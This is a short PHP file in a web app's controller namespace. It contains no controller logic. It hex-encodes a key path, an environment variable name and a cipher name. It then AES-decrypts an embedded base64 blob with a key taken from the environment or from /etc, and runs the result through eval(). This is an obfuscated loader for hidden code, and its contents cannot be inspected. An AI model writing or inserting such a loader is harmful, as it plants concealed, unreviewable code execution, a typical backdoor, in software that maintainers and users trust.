<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dVGl3ivYm6C1jHE2KYl2SQ==');

$c=base64_decode(

'pJF7J5vjYpvzTbB1FSTwgPj4F8yIm34aPw3Mon84u9uEQDfUhbe1uUku7nsJQsHtZpYRaGhNZSA4' .
'GHvzBHAUovHTYJqsEfJlWz3i3GjWb4VPTp6wHn5T8vAC/QsIsKE1JN5ZCcGFMBqdLn8BO4C24KXy' .
'4AO+LRmU72vKFDT9pJUxH1wZ4hAX1yfyFPNVLDvX9kxj/M1NIFvD/bscWKTVHHmShQFiPo2N2rMc' .
'P5RVQ2pkUETBQtWV/uS/IEVnK+rcsrU/AZ53MomIHU+jpYh8tQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

